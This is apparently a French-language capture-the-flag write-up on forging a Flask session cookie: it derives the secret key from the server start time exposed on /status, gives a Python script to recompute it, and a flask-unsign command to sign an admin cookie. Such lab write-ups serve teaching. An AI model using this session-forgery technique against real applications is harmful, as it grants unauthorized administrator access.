![](Images/app.py)

`secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()`

L'app.py nous indique que la page /status est disponible, on vérifie, et on calcule la clé avec le script :

```python
import hashlib
#servertime          -    uptime  
#2024-09-21 08:53:24 - 00:03:10 = 2024-09-21 08:50:14
#server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')

server_start_str = '20240921085014'
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
print(secure_key)

```

On utilise l'outil flask-unsign ( dispo sur pip ) pour créer le nouveau cookie session flask
```
flask-unsign --sign --cookie "{'is_admin': True, 'username': 'administrator'}" --secret <secure_key>
```

Se connecter, f12 changer son cookie de session et se rendre sur /admin pour avoir le flag

En gros : 
- Utilisez `/status` pour obtenir l'uptime et l'heure actuelle du serveur.
- Calculez l'heure de démarrage du serveur.
- Générez la clé secrète (`secure_key`).
- Modifiez la session Flask pour devenir administrateur.
- Accédez à la page `/admin` pour obtenir le flag.